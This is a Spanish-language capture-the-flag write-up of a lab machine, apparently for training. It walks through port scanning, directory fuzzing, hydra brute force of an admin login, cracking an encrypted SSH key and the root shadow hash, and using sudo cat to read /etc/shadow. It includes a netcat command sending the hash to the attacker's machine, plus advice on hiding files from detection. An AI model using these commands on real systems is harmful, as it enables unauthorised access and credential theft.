# <font color=red>[+]</font> Reconocimiento

```bash
sudo nmap -p- -Pn -n -vvv -sS $IP

PORT   STATE SERVICE

22/tcp open  ssh     syn-ack ttl 62
80/tcp open  http    syn-ack ttl 62
```

```bash
sudo nmap -p22,80 -sVC -Pn -n -v -oN versiones.nmap $IP

PORT      STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4b:0e:bf:14:fa:54:b3:5c:44:15:ed:b2:5d:a0:ac:8f (RSA)
|   256 d0:3a:81:55:13:5e:87:0c:e8:52:1e:cf:44:e0:3a:54 (ECDSA)
|_  256 da:ce:79:e0:45:eb:17:25:ef:62:ac:98:f0:cf:bb:04 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
| http-methods: 
|_  Supported Methods: HEAD GET POST OPTIONS
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Vemos que se encuentra activo el puerto HTTP (`80`), por lo que tratamos de interactuar con él ya sea desde un navegador web o la línea de comandos.

```bash
curl http://$IP
```

Vemos que es el `index.html` por defecto del servicio `Apache`. No encontramos nada de interés por lo que empezamos la fase de enumeración activa del entorno web.
## Fuzzing
### `ffuf`

```bash
ffuf -c -w /usr/share/seclist/Discovery/Web-Content/raft-large-directories.txt -u http://$IP -fc 404

admin                   [Status: 301, Size: 316, Words: 20, Lines: 10, Duration: 33ms]
```

Encontramos un directorio `/admin/`, el cual contiene un formulario. Deberemos de hacer fuerza bruta para poder seguir con el *CTF*, para ello tenemos varias alternativas.
## Fuerza Bruta

>[!important]
>Si revisamos el código fuente de la página encontramos un comentario que dice lo siguiente:
>"*Hey john, if you do not remember, the username is admin*"
>
>En este comentario se nos está dando una información, que aunque podríamos haber seguido realizando el ataque con éxito, nos reduce mucho el tiempo del ataque. ***Es muy importante investigar antes de ejecutar un ataque!!!***

Antes de preparar el ataque, debemos de estudiar el formato de la petición que se realiza al servidor. Para ello, podemos usar herramientas como *Burp Suite* que nos permite analizar  e incluso modificar las peticiones HTTP.

Tras realizar un primer intento de *login* usando unas credenciales como *test:test* apreciamos que la petición se realiza a través de un método `POST` con los parámetros `user=test&pass=test`.

>[!tip]
>***hydra*** es una de las herramientas más conocidas y usadas para realizar ataques de fuerza bruta a servicios como ***ssh***, ***ftp*** o ***http***.
>
>Para realizar este ataque usando ***hydra*** deberemos de especificar: 
>1. Nombre de usuario que queremos usar (en este caso `admin`).
>2. Diccionario que usaremos para tratar de adivinar la contraseña.
>3. IP o dominio a atacar.
>4. Tipo de formulario.
>5. Parámetro que identifica el nombre de usuario.
>6. Parámetro que identifica la contraseña.
>7.  Mensaje de error que nos muestra el servidor web cuando fallamos el proceso de *login*.
>```bash
>hydra -l admin -P /usr/share/wordlist/rockyou.txt $IP http-post-form "/admin/:user=^USER^&pass=^PASS^:username or password invalid" 
>
>[80][http-post-form] host: 10.128.179.213   login: admin   password: [hidden]
>```

>[!tip]
>Como segunda alternativa podemos crear ***nuestro propio script*** para realizar el ataque de fuerza bruta.
>
>Este *CTF* es sencillo y no es necesario, pero habrá veces que no podamos usar herramientas automatizadas para realizar ataques, por lo que siempre depender de estas es un error muy común. Tener la capacidad de no solo usar herramientas estándar en la industria, sino tener la capacidad de crear nuestras propias herramientas es una de las *skills* más valoradas en el sector.
>Realmente les animo a sentarse un rato y elaborar un script que ejecute este ataque usando lenguajes como *Python*.
>
>En este mismo repositorio les dejo el código que he creado para realizar el ataque con el objetivo de ayudarles a crear su propia herramienta o darles ideas.
>
>***[Código Python](./Brute-Force_web.py)***

Una vez encontrada la contraseña, se nos redirigirá a un *endpoint* que contiene una de las *flags* que solicita el *CTF* y un enlace en el cual se encuentra una ***clave SSH RSA privada cifrada***.
## La Clave SSH Cifrada

Uno de los encabezados de la clave nos indica que está protegida con una contraseña usando el algoritmo ***AES de 128 bits***.
```
DEK-Info: AES-128-CBC
```

Actualmente, es matemáticamente inviable romper el ***RSA***, así que lo que debemos hacer es realizar un nuevo ***ataque de fuerza bruta*** contra la contraseña que protege el archivo. Podemos hacerlo usando una de las herramientas  más usadas en el sector: `John The Ripper (JtR)`.

>[!tip]
>Antes de lanzarnos a usar cualquiera de las dos herramientas debemos de preparar el terreno. Necesitamos convertir el archivo `.pem` a un formato que `John` pueda reconocer.
>
>```bash
>ssh2john clave.pem > hash.txt
>
># Si te da errores, puedes suar el script genérico puede funcionar
>python3 /usr/share/john/ssh2john.py clave.pem > hash.txt
># El script puede estar en cualquier otra parte, buscalo usando:
># find / -name "ssh2john.py" 2>/dev/null  --> Puede tardar un poco
>```
>
>***John the Ripper***
>Una vez tengamos el hash, podemos tratar de crackear la contraseña usando:
>```bash
>john --wordlist=/usr/share/wodlist/rockyou.txt hash.txt
>```
>
>Si muestra algo como:
>```
>Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
No password hashes left to crack (see FAQ)
>```
>
>Es porque `john` ya ha crackeado ese hash antes y no va a volver a gastar recursos del sistema. Para ver la contraseña tan solo debemos usar:
>```bash
>john --show hash.txt
>
># clave.pem:[hidden]
>```

Una vez tenemos la contraseña de la ***clave SSH***, podemos usar `openssl` para convertir esa clave cifrada en una clave "limpia":
```bash
openssl rsa -in clave.pem -out clave_desencriptada.pem
```

Ya tendremos nuestra clave ***SSH*** limpia, pero para poder usarla debemos de modificar sus permisos para que el servicio ***SSH*** nos acepte la misma:
```bash
chmod 600 clave_descencriptada.pem
```

Ahora, si estamos listos para acceder al servidor vía ***SSH*** como el usuario `john`:
```bash
ssh john@$IP -i clave_desencriptada.pem
```

---
---
# <font color=red>[+]</font> Post-Explotación

Una vez dentro del servidor, tendremos acceso al archivo `user.txt` que se encontrará en el directorio personal del archivo `john`.
## Escala de privilegios

Para escalar privilegios ejecutamos el comando `sudo -l`, el cual nos muestra que podemos usar el comando `cat` con permisos de `root` sin necesidad de contraseña. Esta es una vulnerabilidad enorme, ya que nos permite leer cualquier archivo del sistema.

Sin embargo, en situaciones normales, no será suficiente para escalar privilegios de forma vertical, pero en este *CTF* todo está pensado para girar entorno del cracking y fuerza bruta de credenciales. Por lo que sospecho que si uso el comando `cat` con permisos de `root` para leer el archivo `/etc/shadows` podría obtener información muy valiosa.

>[!important]
>El archivo `/etc/shadows` es una fichero en el que se encuentra los hashes de contraseña de los usuarios del sistema.

```bash
sudo cat /etc/shadow

root:$6$zdk0.jUm$Vya24cGzM1duJkwM5b17Q205xDJ47LOAg/OpZvJ1gKbLF8PJBdKJA4a6M.JYPUTAaWu4infDjI88U9yUXEVgL.:18490:0:99999:7:::
```

Deberemos de pasar el hash a nuestra máquina atacante que es donde tenemos todas las herramientas necesarias para tratar de conseguir la contraseña.

>[!tip]
>Podríamos hacer esto de una forma muy simple tan solo copiando y pegando lo que nos interesa, sin embargo es interesante realizar todo el trabajo desde la terminal para que así el día que no contemos con una interfaz gráfica no nos encontremos en problemas.
>
>1. Tomamos lo que nos interesa del archivo `/etc/shadow`:
>   ```bash
>   sudo cat /etc/shadow | awk -F: 'NR==1 {print $2}' > $(mktemp -d)/root_hash.txt
>   ```
>   Estamos almacenando el hash en un fichero dentro del directorio `tmp` para que sea más complicado detectar nuestros movimientos, ya que si lo dejáramos en la ruta por defecto podrían detectar el fichero si no lo borramos.
>
>2. Enviamos el contenido del fichero desde la máquina víctima a nuestra máquina atacante usando `nc`:
>	1.  Configuramos un puerto para que esté a la escucha, y cuando obtenga la información del fichero lo guarde en un archivo con el mismo nombre:
>	   ```bash
>	   nc -lvnp 4444 > root_hash.txt
>	   ```
>	2. En la máquina víctima usamos `nc` para conectarnos a nuestra máquina y enviarle el contenido del archivo:
>	   ```bash
>	   nc $IP_KALI 4444 < root_hash.txt
>	   ```
>
>3. Tras eso, ya tenemos el hash en nuestro sistema y podes ejecutar las herramientas necesarias.

>[!warning]
>***Crackeo de hash***
>Al ser un algoritmo de hash muy potente (***SHA-516 crypt***), usaremos `hashcat` ya que nos permite usar la potencia de nuestra ***GPU***.
>```bash
>hashcat -m 1800 root_hash.txt /usr/share/wordlist/rockyou.txt
>
>$6$zdk0.jUm$Vya24cGzM1duJkwM5b17Q205xDJ47LOAg/OpZvJ1gKbLF8PJBdKJA4a6M.JYPUTAaWu4infDjI88U9yUXEVgL.:[hidden]
>```

Una vez obtenida la contraseña del usuario `root`, podemos cambiar de usuario con el comando `su`:
```bash
su

whoami
# root
```
